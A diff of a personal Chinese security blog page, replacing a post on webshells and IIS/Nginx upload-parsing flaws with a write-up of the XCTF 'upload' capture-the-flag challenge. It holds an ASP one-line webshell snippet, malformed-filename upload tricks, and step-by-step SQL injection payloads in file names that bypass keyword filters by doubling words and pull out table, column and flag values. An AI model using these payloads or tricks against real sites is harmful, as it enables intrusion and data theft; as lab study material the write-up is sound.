@@ -6,20 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>webshell 上传/解析漏洞 | cruoni的博客</title>
+  <title>XCTF 攻防世界 -upload | cruoni的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
-<meta name="keywords" content="web">
+  <meta name="description" content="刚进入是一个注册界面 登陆后是一个文件上传界面上传后给除uid 但没有给出存储路径 无法访问 看了writeup后发现是注入，利用上传文件名进行sql注入。 过滤了select,from等关键词(通过双写绕过) 猜测表的结构，推测后台的insert语句1insert into 表名(&amp;apos;filename&amp;apos;,...) values(&amp;apos;你上传的文件名&amp;apos;,...);">
+<meta name="keywords" content="XCTF WriteUP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="webshell 上传&#x2F;解析漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/index.html">
+<meta property="og:title" content="XCTF 攻防世界 -upload">
+<meta property="og:url" content="http://yoursite.com/2019/08/12/XCTF-攻防世界-upload/index.html">
 <meta property="og:site_name" content="cruoni的博客">
-<meta property="og:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta property="og:description" content="刚进入是一个注册界面 登陆后是一个文件上传界面上传后给除uid 但没有给出存储路径 无法访问 看了writeup后发现是注入，利用上传文件名进行sql注入。 过滤了select,from等关键词(通过双写绕过) 猜测表的结构，推测后台的insert语句1insert into 表名(&amp;apos;filename&amp;apos;,...) values(&amp;apos;你上传的文件名&amp;apos;,...);">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-14T08:13:14.823Z">
+<meta property="og:image" content="https://i.loli.net/2019/08/12/VLYof2Ts3iq4Gmh.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/12/wGyq3s6SbFhXAci.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/13/7vrgHTuIBwKQX2V.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/13/1Q2vuqNjYJfKkwH.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/13/2AgP69UQdql7uJj.png">
+<meta property="og:updated_time" content="2019-08-14T08:11:27.574Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="webshell 上传&#x2F;解析漏洞">
-<meta name="twitter:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta name="twitter:title" content="XCTF 攻防世界 -upload">
+<meta name="twitter:description" content="刚进入是一个注册界面 登陆后是一个文件上传界面上传后给除uid 但没有给出存储路径 无法访问 看了writeup后发现是注入，利用上传文件名进行sql注入。 过滤了select,from等关键词(通过双写绕过) 猜测表的结构，推测后台的insert语句1insert into 表名(&amp;apos;filename&amp;apos;,...) values(&amp;apos;你上传的文件名&amp;apos;,...);">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/12/VLYof2Ts3iq4Gmh.png">
   
     <link rel="alternative" href="/atom.xml" title="cruoni的博客" type="application/atom+xml">
   
@@ -145,43 +151,63 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-webshell-上传-解析漏洞" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-XCTF-攻防世界-upload" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      webshell 上传/解析漏洞
+      XCTF 攻防世界 -upload
     </h1>
   
 
         
-        <a href="/2019/07/25/webshell-上传-解析漏洞/" class="archive-article-date">
-  	<time datetime="2019-07-25T07:48:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
+        <a href="/2019/08/12/XCTF-攻防世界-upload/" class="archive-article-date">
+  	<time datetime="2019-08-12T01:06:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1><span id="什么是webshell">什么是Webshell</span></h1><h2><span id="webshell定义">Webshell定义</span></h2><p>Web服务端的一种脚本工具</p>
-<h2><span id="webshell功能">Webshell功能</span></h2><ol>
-<li>环境探针</li>
-<li>资源管理器</li>
-<li>文件编辑器</li>
-<li>执行OS命令</li>
-<li>读取注册表</li>
-<li>创建Socket</li>
-<li>调用系统组件</li>
-</ol>
-<h2><span id="webshell的分类">Webshell的分类</span></h2><p>功能强弱分为大马、小马、一句话木马</p>
-<p>一句话木马：<br><code>%eval request(&quot;pass&quot;)%&gt;</code><br>eval 将request(“pass”)转化成代码执行 request功能：引用外部文件</p>
-<p>IIS 5.X/6.0 解析漏洞</p>
-<p>Is7.0/ IIS 7.5 /Nginx &lt; 0.83 畸形解析漏洞<br>xxx.jpg/.php</p>
-<p>Nginx 0.5 0.6 0.7-0.7.65 0.8-0.8.37 空字节代码执行漏洞<br>xxx.jpg%00.php</p>
-<p>Apache解析漏洞</p>
-<p>windows 不允许这两个文件存在 （末尾为.或空格）<br>xx.jpg.  xx.jpg_ (_为空格)<br>上传成功后会自动把 . _ 去掉</p>
+        <p>刚进入是一个注册界面 登陆后是一个文件上传界面<br><img src="https://i.loli.net/2019/08/12/VLYof2Ts3iq4Gmh.png" alt=""><br>上传后给除uid 但没有给出存储路径 无法访问<br><img src="https://i.loli.net/2019/08/12/wGyq3s6SbFhXAci.png" alt=""></p>
+<p>看了writeup后发现是注入，利用上传文件名进行sql注入。</p>
+<p>过滤了select,from等关键词(通过双写绕过)<br><img src="https://i.loli.net/2019/08/13/7vrgHTuIBwKQX2V.png" alt=""></p>
+<p>猜测表的结构，推测后台的insert语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名(&apos;filename&apos;,...) values(&apos;你上传的文件名&apos;,...);</span><br></pre></td></tr></table></figure></p>
+<p>几个函数</p>
+<blockquote>
+<p>hex():<br>返回十六进制值N一个字符串的表示，在此N是一个长整型(BIGINT)数字，这等价于CONV(N,10,16) </p>
+</blockquote>
+<blockquote>
+<p>CONV(N,from_base,to_base):<br>进制转换，在不同的数字基数之间转换数字。将数字 N 从from_base 转换到 to_base，并以字符串形式返回。如果任何一个参数为 NULL，那么返回值也为 NULL。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>CONV(5,16,2)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>101</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>substr(string string, int a, int b):<br>string 需要截取的字符串<br>a 截取字符串的<strong>开始</strong>位置（当a等于0或1时，都是从第一位开始截取）<br>b 要截取的字符串的长度</p>
+</blockquote>
+<p>注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&apos;.jpg</span><br></pre></td></tr></table></figure></p>
+<p>因为查询字符串太长，回显数字过大会使用科学记数法表示，因此使用substr截取查询字符串进行分段查询。<br><img src="https://i.loli.net/2019/08/13/1Q2vuqNjYJfKkwH.png" alt=""></p>
+<p>回显的数字为十进制，转成16进制后再转成ASCII码字符<br><img src="https://i.loli.net/2019/08/13/2AgP69UQdql7uJj.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),1,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;131277325825392=&gt;web_up</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex(database()),13,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;1819238756=&gt;load</span><br></pre></td></tr></table></figure>
+<p>拼接后得知数据库名为:web_upload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = &apos;web_upload&apos; limit 1,1)),1,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;114784820031327=&gt;hello_</span><br><span class="line"></span><br><span class="line">s&apos;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = &apos;web_upload&apos; limit 1,1)),13,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;112615676665705=&gt;flag_i</span><br><span class="line"></span><br><span class="line">s&apos;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = &apos;web_upload&apos; limit 1,1)),25,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;126853610566245=&gt;s_here</span><br></pre></td></tr></table></figure>
+<p>拼接起来得知存放flag的表名为:hello_flag_is_here</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &apos;hello_flag_is_here&apos; limit 0,1)),1,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;115858377367398=&gt;i_am_f</span><br><span class="line"></span><br><span class="line">s&apos;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &apos;hello_flag_is_here&apos; limit 0,1)),13,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;7102823=&gt;lag</span><br></pre></td></tr></table></figure>
+<p>得到存放flag的字段：i_am_flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;36427215695199=&gt;!!_@m_</span><br><span class="line"></span><br><span class="line">s&apos;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;92806431727430=&gt;Th.e_F</span><br><span class="line"></span><br><span class="line">s&apos;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&apos;.jpg</span><br><span class="line">=&gt;560750951=&gt;!lag</span><br></pre></td></tr></table></figure>
+<p>拼接后得到:!!_@m_Th.e_F!lag<br>提交不通过不知道什么问题，看了其他的writeup也是这个flag</p>
 
       
 
@@ -216,7 +242,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">XCTF WriteUP</a>
         		</li>
       		
 		</ul>
@@ -272,7 +298,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/12/XCTF-攻防世界-upload/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -286,18 +312,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/07/30/CG-CTF-Web/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/08/14/5G/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          CG-CTF Web
+          5G
         
       </div>
     </a>
   
   
-    <a href="/2019/07/25/SSRF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSRF</div>
+    <a href="/2019/08/09/CSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CSRF</div>
       <i class="icon-circle-right"></i>
     </a>
   
